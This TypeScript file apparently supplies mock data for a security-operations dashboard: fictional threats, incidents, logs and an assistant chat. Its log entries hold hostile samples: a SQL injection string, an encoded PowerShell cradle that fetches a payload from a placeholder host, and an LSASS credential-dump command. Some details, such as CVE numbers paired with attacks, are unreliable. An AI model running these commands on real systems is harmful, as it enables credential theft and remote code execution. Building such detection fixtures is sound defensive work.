import { Threat, Incident, SecurityLog, ChatMessage } from './types';

export const mockThreats: Threat[] = [
  {
    id: 'THR-782',
    title: 'Distributed SQL Injection & Data Extraction',
    category: 'Web Application Attack',
    riskScore: 94,
    severity: 'critical',
    timestamp: '2026-05-24T07:44:12Z',
    source: '185.220.101.44 (Tor Exit Node)',
    destination: 'customer-db-primary.prod.securemind.ai',
    status: 'Active',
    attackVector: 'CVE-2025-4421 (Unauthenticated SQL Injection in Custom API Endpoint)',
    affectedAssets: ['db-server-01a', 'billing-api-v2'],
    cve: 'CVE-2025-4421',
    description: 'An attacker is executing union-based SQL injection statements on the customer profile query-endpoint, extracting encrypted login hashes and session tables. Traffic analysis confirms unauthorized outbound packet spikes.',
    aiExplanation: 'Threat actor leveraged an unpatched inputs validation flaw in our API server. The payload is bypassing standard regex-guards by using hex-encoded string concatenations (`0x756e696f6e`). Immediate query sanitization or WAF blocking of Tor-associated CIDRs (185.220.101.0/24) is advised.'
  },
  {
    id: 'THR-619',
    title: 'Anomalous Lateral Movement & Active Directory Scan',
    category: 'Internal Scouting',
    riskScore: 88,
    severity: 'high',
    timestamp: '2026-05-24T07:15:32Z',
    source: '10.140.22.89 (Dev-Workstation-JHA)',
    destination: 'dc-01.corp.securemind.ai',
    status: 'Investigating',
    attackVector: 'Kerberoasting & LDAP Enumeration',
    affectedAssets: ['dc-01.corp', 'active-directory-controller'],
    description: 'Multiple abnormal LDAP search requests were initiated by a developer work session within 2 minutes, attempting to pull service principals or query high-privilege administrative tokens. Followed by a Mimikatz-like LSASS memory dump alert from the local EDR agent.',
    aiExplanation: 'The workstation of user "Abhishek Kumar Jha" began bulk-querying service tickets without a valid application context. This is highly indicative of credential harvesting via Kerberoasting, likely indicating a compromised local workstation.'
  },
  {
    id: 'THR-503',
    title: 'Mass Data Exfiltration to Megaupload S3-Bucket',
    category: 'Data Exfiltration',
    riskScore: 78,
    severity: 'high',
    timestamp: '2026-05-24T06:55:01Z',
    source: '10.140.124.12 (prod-analytics-worker-04)',
    destination: '96.22.189.102 (S3 Storage Object)',
    status: 'Active',
    attackVector: 'Rogue Data Staging Task',
    affectedAssets: ['analytics-datastore-s3', 'prod-analytics-worker-04'],
    cve: 'N/A',
    description: 'Continuous egress transfer of encrypted ZIP files exceeding 45GB over TCP port 443 to an unrecognized, non-whitelisted remote object storage. CloudTrail credentials used are associated with a deprecated internal service account.',
    aiExplanation: 'An automated container cron job appears to have its IAM keys compromised. The container has packed and zipped database cache folders prior to transmission, indicating a highly coordinated exfiltration script.'
  },
  {
    id: 'THR-294',
    title: 'SSH Hard Bruteforce on Public Jump-Host',
    category: 'Credential Cracking',
    riskScore: 64,
    severity: 'medium',
    timestamp: '2026-05-24T07:59:00Z',
    source: '45.143.203.111 (Anonymized VPN)',
    destination: 'jump.prod.securemind.ai',
    status: 'Active',
    attackVector: 'SSH Dictionary Attack',
    affectedAssets: ['jump-host-external-01'],
    description: 'Over 10,000 login failures observed within the last hour using common dictionaries (admin, root, dev-user, support). No successful logins from this IP have occurred yet, but high load on SSH daemon has triggered alarms.',
    aiExplanation: 'Classic brute-force scanning botnet activity. Since MFA is enforced on our jump host, compromised access risk is medium. However, the IP should be blacklisted at edge firewall to prevent CPU exhaust.'
  },
  {
    id: 'THR-108',
    title: 'Suspicious Cloud MFA Device Enrolled',
    category: 'Privilege Escalation',
    riskScore: 82,
    severity: 'high',
    timestamp: '2026-05-24T05:12:44Z',
    source: 'AzureAD-ServiceManager',
    destination: 'User-Corey.Page (Global Admin)',
    status: 'Investigating',
    attackVector: 'MFA Push Fatigue / Session Hijack',
    affectedAssets: ['EntraID / Microsoft 365 Tenant'],
    description: 'A new FIDO2 security key was registered from an IP addresses located in Frankfurt, Germany. The user Corey Page was verified to be connected from New York, USA just 30 minutes prior. High-velocity travel discrepancy detected.',
    aiExplanation: 'The user likely fell victim to a session hijacking proxy (e.g. Evilginx) or approved a faulty MFA push alert from spamming, permitting the attacker to insert a rogue persistent MFA key.'
  },
  {
    id: 'THR-52',
    title: 'Internal Subnet Port Sweeper Script Executed',
    category: 'Reconnaissance',
    riskScore: 35,
    severity: 'low',
    timestamp: '2026-05-24T07:55:10Z',
    source: '10.140.40.78 (Build-Agent-07)',
    destination: '10.140.40.0/24 subnet',
    status: 'Mitigated',
    attackVector: 'Network Discovery',
    affectedAssets: ['Build-Agent-07'],
    description: 'A bash shell executed on Build-Agent-07 performed standard full subnet sweep across port 80, 443, 8080, and 22. Device isolated automatically by pre-configured Playbook AD-07.',
    aiExplanation: 'Build agent had a test script executing parallel network testing checks. Though confirmed inside a test workflow, agent was safely quarantined for assessment.'
  },
  {
    id: 'THR-12',
    title: 'Unsigned Driver Loaded in Local Host Kernel',
    category: 'Rootkit Danger',
    riskScore: 92,
    severity: 'critical',
    timestamp: '2026-05-24T03:10:05Z',
    source: 'endpoint-win-finance-20',
    destination: 'Kernel Memory Space',
    status: 'Investigating',
    attackVector: 'BYOVD (Bring Your Own Vulnerable Driver)',
    affectedAssets: ['endpoint-win-finance-20'],
    cve: 'CVE-2021-40444',
    description: 'An attacker bypassed driver signing enforcement on the endpoint by introducing an older, vulnerable signed driver (gdrv.sys) to gain direct ring-0 privileges and disable antivirus monitoring services.',
    aiExplanation: 'BYOVD attack detected by security logs. The threat actor is utilizing hardware-level memory writes to evade EDR and hide active remote-control execution. Device requires physical isolation from the LAN.'
  }
];

export const mockIncidents: Incident[] = [
  {
    id: 'INC-2026-0041',
    title: 'Multi-Stage Intrusion Investigation (APT-39)',
    severity: 'critical',
    riskScore: 96,
    status: 'Open',
    category: 'Targeted Attack / Intrusion',
    assignedTo: 'SecOps Team Lead (Abhishek Jha)',
    timestamp: '2026-05-24T07:44:12Z',
    rootCause: 'Compromised developer credentials via Phishing, followed by lateral SSO migration, unpatched local microservice exploitation, and Union-based SQL injection on customer base.',
    description: 'An advanced threat group has staged and launched a nested attack starting from a developer credential compromise. After bypassing authentication layers using session reuse, they identified a billing-api-v2 query endpoint with an active SQL vulnerability (CVE-2025-4421) and are attempting full DB table extractions.',
    timeline: [
      {
        id: 't-1',
        timestamp: '06:12:05',
        title: 'Initial SSO Access',
        description: 'Developer Abhishek Kumar Jha logged in from an IP labeled as Tor network exit. SSO MFA was completed using push token bypass.',
        source: 'AzureAD SSO Logs',
        type: 'alert'
      },
      {
        id: 't-2',
        timestamp: '06:18:10',
        title: 'Workstation Lateral Ping',
        description: 'A remote registry query command was executed from Abhishek workstation to the internal API dev server, requesting system user catalogs.',
        source: 'CrowdStrike EDR Agent',
        type: 'alert'
      },
      {
        id: 't-3',
        timestamp: '07:15:32',
        title: 'AD Kerberos Token Harvest',
        description: 'Kerberoasting attack was initiated, gaining offline cracked hashes of the service principal billing account.',
        source: 'SecureMind Domain Monitor',
        type: 'alert'
      },
      {
        id: 't-4',
        timestamp: '07:22:40',
        title: 'Automatic Firewall Isolation Tried',
        description: 'Adaptive incident policy IP-02 triggered. Isolation block on IP 185.220.101.44 attempted at Cloud Gateway Firewall.',
        source: 'Palo Alto Edge NGFW',
        type: 'action'
      },
      {
        id: 't-5',
        timestamp: '07:44:12',
        title: 'SQL Data Extraction Detected',
        description: 'Large anomalous outbound payload size detected originating from customer-db-primary to Tor gateway.',
        source: 'Imperva Web App Firewall',
        type: 'alert'
      },
      {
        id: 't-6',
        timestamp: '07:50:00',
        title: 'Analyst Quarantined Workstation',
        description: 'SecOps manual responder quarantined Dev-Workstation-JHA using EDR host-isolation controls. Active SSH connections severed.',
        source: 'Analyst Control Room',
        type: 'action'
      }
    ],
    nodes: [
      { id: '1', label: 'Dark Web Tor Operator (Attacker)', type: 'attacker', status: 'danger', ip: '185.220.101.44' },
      { id: '2', label: 'Cloud Gateway Edge (WAF)', type: 'firewall', status: 'warning', ip: '10.140.10.1' },
      { id: '3', label: 'Workstation-Abhishek', type: 'user', status: 'danger', ip: '10.140.22.89' },
      { id: '4', label: 'Billing API Microservice', type: 'server', status: 'warning', ip: '10.140.50.15' },
      { id: '5', label: 'Primary DB System', type: 'database', status: 'danger', ip: '10.140.102.4' },
      { id: '6', label: 'SecureMind AI Sentinel', type: 'ai', status: 'secure', ip: 'Internal Engine' }
    ],
    edges: [
      { from: '1', to: '2', type: 'compromised', label: 'Distributed SQL Injection API Probe' },
      { from: '1', to: '3', type: 'compromised', label: 'SSO Credential Hijack & Remote Shell' },
      { from: '3', to: '4', type: 'active', label: 'Kerberos Ticket Privilege Abuse' },
      { from: '4', to: '5', type: 'compromised', label: 'Raw Union DB Select' },
      { from: '2', to: '4', type: 'blocked', label: 'WAF Rate-Limiting Policy Applied' },
      { from: '6', to: '3', type: 'blocked', label: 'EDR Agent Host Quarantine' }
    ],
    recommendations: [
      'Revoke Active AD Refresh Tokens for Abhishek Kumar Jha immediately and initiate an Out-of-Band phone contact verification.',
      'Deploy custom WAF rules to drop payload signatures matching `/*+ UNION SELECT */` or `sys.tables` lookups globally.',
      'Quarantine Dev-Workstation-JHA to subnet VLAN 900 for offline forensic backup and analysis.',
      'Rotate database master decryption keys and billing application SSO shared secrets immediately.',
      'Audit log files for internal system user accounts configured during the last 24 hours.'
    ],
    notes: [
      '07:51 - Abhishek J.: Isolation verified. The source EDR reported successful containment on physical laptop network interface.',
      '07:55 - AI Bot: Detected similarity match with known APT-39 playbook vectors (T1110.002 Brute-Force, T1558.003 Kerberoasting). Recommended immediate rotate of Active Directory KRBTGT password.'
    ]
  },
  {
    id: 'INC-2026-0042',
    title: 'High-Velocity Ransomware Ingress Attempt',
    severity: 'high',
    riskScore: 84,
    status: 'Investigating',
    category: 'Malware Execution',
    assignedTo: 'Security Analyst 02 (Sarah Connor)',
    timestamp: '2026-05-24T06:55:00Z',
    rootCause: 'PDF Attachment downloaded from internal HR mock email, containing macro scripts that execute PowerShell download-cradle pointing to LockBit 3.0 binaries.',
    description: 'An employee workstation downloaded and launched an executable attachment pretending to be a benefits revision sheet. Local antivirus flagged suspicious volume file renaming patterns matching `.lockbit` structures.',
    timeline: [
      {
        id: 't2-1',
        timestamp: '06:40:00',
        title: 'Mailed Link Checked',
        description: 'User clicked high-risk attachment URL inside Outlook mailer from untrusted domain.',
        source: 'Proofpoint Mail Archiver',
        type: 'alert'
      },
      {
        id: 't2-2',
        timestamp: '06:42:15',
        title: 'PowerShell Cradle Launched',
        description: 'PowerShell requested remote executable package from port 8080: raw.githubusercontent-malicious.',
        source: 'Windows Task Runner Security',
        type: 'alert'
      },
      {
        id: 't2-3',
        timestamp: '06:43:00',
        title: 'Antivirus Intercepted Renamer',
        description: 'SentinelOne Agent actively blocked mass rename triggers on local Documents folder.',
        source: 'SentinelOne Agent Endpoint',
        type: 'action'
      }
    ],
    nodes: [
      { id: '1', label: 'Compromised Ingress Host', type: 'user', status: 'danger', ip: '10.140.24.112' },
      { id: '2', label: 'Internet Payload Origin', type: 'attacker', status: 'danger', ip: '185.122.90.1' },
      { id: '3', label: 'Local File Server', type: 'database', status: 'secure', ip: '10.140.10.50' }
    ],
    edges: [
      { from: '2', to: '1', type: 'compromised', label: 'HTTP Exe Download' },
      { from: '1', to: '3', type: 'blocked', label: 'SMB Share Blocked via Active Policy' }
    ],
    recommendations: [
      'Identify and isolate IP 10.140.24.112 fully at layer-2 switch trunk config.',
      'Check if local shadow copies were destroyed by calling vssadmin on endpoint.',
      'Initiate enterprise-wide block of LockBit indicator IPs at router edge.'
    ],
    notes: [
      '07:05 - Sarah C: User confirmed they downloaded a resume package file. They did not notice any screen freezing yet. Workcomputer is isolated.'
    ]
  },
  {
    id: 'INC-2026-0043',
    title: 'Kubernetes Cluster Privilege Bypass Probe',
    severity: 'medium',
    riskScore: 58,
    status: 'Resolved',
    category: 'Cloud Configuration Exploitation',
    assignedTo: 'Cloud Admin Team',
    timestamp: '2026-05-24T05:22:10Z',
    rootCause: 'Exposed Kubelet API port 10250 permitting unauthenticated read commands from intermediate VPN proxy.',
    description: 'An external network scanning engine queried the internal cluster Kubelet stats API. The open port was identified during routine configuration audit. The port was immediately secured using strict security group overlays.',
    timeline: [
      {
        id: 't3-1',
        timestamp: '05:10:00',
        title: 'Scanning Event Logged',
        description: 'Continuous request headers to microservice stats port detected.',
        source: 'Kubernetes Audit Service',
        type: 'alert'
      },
      {
        id: 't3-2',
        timestamp: '05:22:10',
        title: 'Patch Triggered',
        description: 'Applied restricted security group blocking WAN-range access on port 10250.',
        source: 'Terraform State Trigger',
        type: 'action'
      }
    ],
    nodes: [
      { id: '1', label: 'Shodan Security Crawler', type: 'attacker', status: 'warning', ip: '77.89.22.45' },
      { id: '2', label: 'Kubernetes Primary Node', type: 'cloud', status: 'secure', ip: '10.220.44.12' }
    ],
    edges: [
      { from: '1', to: '2', type: 'blocked', label: 'TCP Connection Reset by Peer (Rule A1)' }
    ],
    recommendations: [
      'Ensure standard automated CIS benchmark checks pass on production EKS endpoints daily.',
      'Deploy k3s config overlays with default unauth flags deactivated.'
    ],
    notes: [
      '05:30 - CloudSec: Terraform patch verified successfully. Cluster is green.'
    ]
  }
];

export const mockLogs: SecurityLog[] = [
  {
    id: 'LOG-882201',
    timestamp: '2026-05-24T08:01:45Z',
    message: 'WAF detected Signature Injection in customer API query: union-based extract attempts detected',
    source: '185.220.101.44',
    destination: '10.140.50.15',
    severity: 'critical',
    type: 'WAF',
    action: 'BLOCKED',
    payload: {
      httpMethod: 'POST',
      uri: '/api/v2/customer/billing/search',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
      injectionPayload: "' UNION SELECT username, password_hash, mfa_secret FROM users --",
      ruleID: '942100-SQLi-Union',
      relevanceScore: 98
    }
  },
  {
    id: 'LOG-882202',
    timestamp: '2026-05-24T08:01:12Z',
    message: 'User authentication session token successfully refreshed with multi-factor push response',
    source: '172.56.21.99',
    destination: 'Azure-AD-Tenant-01',
    severity: 'low',
    type: 'SSO Auth',
    action: 'ALLOWED',
    payload: {
      user: 'abhishek.jha@securemind.ai',
      deviceType: 'YubiKey-FIDO2-Slot01',
      sessionExpiry: '14 Hours',
      authServer: 'EntraID-US-East',
      location: 'New York, US'
    }
  },
  {
    id: 'LOG-882203',
    timestamp: '2026-05-24T08:00:33Z',
    message: 'Local execution of PowerShell running base64 encoded command string',
    source: '10.140.22.89',
    destination: 'github-malicious-repo-cdn',
    severity: 'high',
    type: 'EDR Agent',
    action: 'ALERTED',
    payload: {
      processId: 4412,
      parentProcess: 'cmd.exe',
      commandLine: 'powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAcwBpAHQAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA',
      sha256Hash: '3af3910c284ae90b83ef9ccf39009ff44b679a95727',
      threatIntelMatch: 'LockBit PowerShell Cradle V1.4'
    }
  },
  {
    id: 'LOG-882204',
    timestamp: '2026-05-24T07:59:15Z',
    message: 'IP Address blocked due to excessive SSH login trials (100 attempts / 10 sec limit)',
    source: '45.143.203.111',
    destination: '10.140.10.8',
    severity: 'medium',
    type: 'Firewall',
    action: 'BLOCKED',
    payload: {
      port: 22,
      protocol: 'TCP',
      droppedPackets: 1422,
      firewallRule: 'BlockBruteForceSSH_EdgeGlobal',
      zone: 'External-to-PCI'
    }
  },
  {
    id: 'LOG-882205',
    timestamp: '2026-05-24T07:58:10Z',
    message: 'Kubernetes apiserver: Unauthenticated request to endpoint /api/v1/namespaces/default/pods',
    source: '77.89.22.45',
    destination: '10.220.44.12',
    severity: 'medium',
    type: 'Kubernetes Audit',
    action: 'BLOCKED',
    payload: {
      apiVersion: 'audit.k8s.io/v1',
      requestURI: '/api/v1/namespaces/default/pods',
      userId: 'system:anonymous',
      clientUserAgent: 'Go-http-client/2.0',
      decision: 'forbid'
    }
  },
  {
    id: 'LOG-882206',
    timestamp: '2026-05-24T07:56:44Z',
    message: 'Database query execution time spiked over normal baseline threshold (+350%)',
    source: '10.140.50.15',
    destination: 'customer-db-primary',
    severity: 'low',
    type: 'VPC Flows',
    action: 'ALLOWED',
    payload: {
      dbInstance: 'postgres-customer-master',
      queryTemplate: 'SELECT * FROM clients WHERE company_id = ?',
      executionMs: 1420,
      baselineMs: 3.2,
      concurrentConnections: 64
    }
  },
  {
    id: 'LOG-882207',
    timestamp: '2026-05-24T07:55:01Z',
    message: 'Outbound transfer size warning: abnormal egress volume on port 443 detected',
    source: '10.140.124.12',
    destination: '96.22.189.102',
    severity: 'high',
    type: 'VPC Flows',
    action: 'ALERTED',
    payload: {
      protocol: 'TCP',
      bytesSent: '45.18 GB',
      connectionDurationSec: 1800,
      destCidrOwner: 'Megaupload Content Storage Node',
      anomalyScore: 92
    }
  },
  {
    id: 'LOG-882208',
    timestamp: '2026-05-24T07:52:19Z',
    message: 'Crowdstrike EDR Agent: Command executed to dump local LSASS process memory bytes',
    source: '10.140.22.89',
    destination: 'Local OS Memory',
    severity: 'critical',
    type: 'EDR Agent',
    action: 'QUARANTINED',
    payload: {
      originBin: 'C:\\Windows\\System32\\rundll32.exe',
      arguments: 'comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full',
      triggeredByAccount: 'DEV-SYSTEM\\Administrator',
      threatIndicators: ['MITRE-T1003.001', 'CredentialHarvesterMemoryAccess']
    }
  },
  {
    id: 'LOG-882209',
    timestamp: '2026-05-24T07:49:00Z',
    message: 'DNS Lookup anomaly: host queried non-standard high-random subdomain (DGA check)',
    source: '10.140.30.55',
    destination: 'dns-resolver-01',
    severity: 'low',
    type: 'VPC Flows',
    action: 'ALLOWED',
    payload: {
      dnsQuery: 'qwxzkymnlpoiuwer.dynamic-c2.net',
      entropyRating: 4.88,
      queryType: 'AAAA',
      recommendsBlock: true
    }
  },
  {
    id: 'LOG-882210',
    timestamp: '2026-05-24T07:45:00Z',
    message: 'Edge WAF rule updated: Tor exit nodes flagged as high-risk zone block',
    source: 'Console Admin API',
    destination: 'WAF-Engines-All',
    severity: 'low',
    type: 'WAF',
    action: 'ALLOWED',
    payload: {
      actionInitiatedBy: 'System Automation Engine',
      pushedChange: 'Zone Add [TOR_EXIT_IPS]',
      reloadSuccessful: true
    }
  }
];

export const mockChatHistory: ChatMessage[] = [
  {
    id: 'c-1',
    role: 'assistant',
    text: 'Good morning, Analyst. I have scanned the Security Operations Center queue. \n\nWe currently have **1 Critical** and **1 High**-severity incident active. \n\nI have prepared a structural forensic trace on **INC-2026-0041 (APT-39)**. What cyber event would you like to investigate first?',
    timestamp: '08:00:10'
  },
  {
    id: 'c-2',
    role: 'user',
    text: 'Why was INC-2026-0041 flagged as Critical?',
    timestamp: '08:01:05'
  },
  {
    id: 'c-3',
    role: 'assistant',
    text: 'It received a **Risk Score of 96** due to several highly correlated factors demonstrating active adversarial presence:\n\n1. **Credential Attack Over AD**: The session originated from a Tor node proxy and immediately bypassed SSO push notification screens (suspected session-token cloning/hijack).\n2. **Lateral Shift to API Server**: The actor moved from user endpoints to the core API servers by hijacking a database service principal ticket (Kerberoasting).\n3. **SQL Injection Data Mining**: Active data mining attempts (`UNION SELECT` commands) have been detected targeting active payment databases on server `db-server-01a` with high outbound transfers.\n\nHere is a remediation roadmap I have computed for you:',
    timestamp: '08:01:25',
    insights: {
      type: 'remediation',
      title: 'Actionable Threat Mitigation Plan',
      items: [
        'Run SSO global-revoke to sever active authentication credentials.',
        'Apply immediate ingress block rules on 185.220.101.44 at the Cloud Gateway.',
        'Quarantine intermediate Workstation 10.140.22.89 via local Crowdstrike EDR agent interface.',
        'Enforce high-relevance query sanitization layers on API server class: billing-api-v2.'
      ]
    }
  }
];

export const mockSystemStats = {
  overallRisk: 78,
  activeThreats: 14,
  incidentsResolvedToday: 9,
  criticalIncidents: 1,
  threatDistribution: [
    { name: 'SQL Injection', value: 35, color: '#ef4444' },
    { name: 'Credential Theft', value: 25, color: '#f97316' },
    { name: 'Data Exfiltration', value: 20, color: '#eab308' },
    { name: 'Brute Force Bot', value: 15, color: '#22c55e' },
    { name: 'Other', value: 5, color: '#64748b' }
  ],
  weeklyTrends: [
    { date: '05/18', blocked: 4200, critical: 0, high: 2, medium: 15 },
    { date: '05/19', blocked: 4800, critical: 1, high: 4, medium: 18 },
    { date: '05/20', blocked: 5120, critical: 0, high: 3, medium: 12 },
    { date: '05/21', blocked: 4900, critical: 1, high: 5, medium: 22 },
    { date: '05/22', blocked: 6200, critical: 2, high: 8, medium: 35 },
    { date: '05/23', blocked: 6800, critical: 3, high: 12, medium: 41 },
    { date: '05/24', blocked: 7420, critical: 4, high: 14, medium: 38 }
  ],
  geographies: [
    { country: 'United States', ip: '192.110.12.83', hits: 1421, risk: 'low', type: 'Normal SSO' },
    { country: 'Germany', ip: '45.143.203.111', hits: 840, risk: 'high', type: 'SSH Bruteforce Host' },
    { country: 'Tor Network', ip: '185.220.101.44', hits: 312, risk: 'critical', type: 'Active SQLi Attacker' },
    { country: 'Singapore', ip: '112.199.12.15', hits: 198, risk: 'medium', type: 'SSH Scanning Probe' },
    { country: 'Brazil', ip: '200.41.9.92', hits: 110, risk: 'low', type: 'Webhook Listener' }
  ]
};
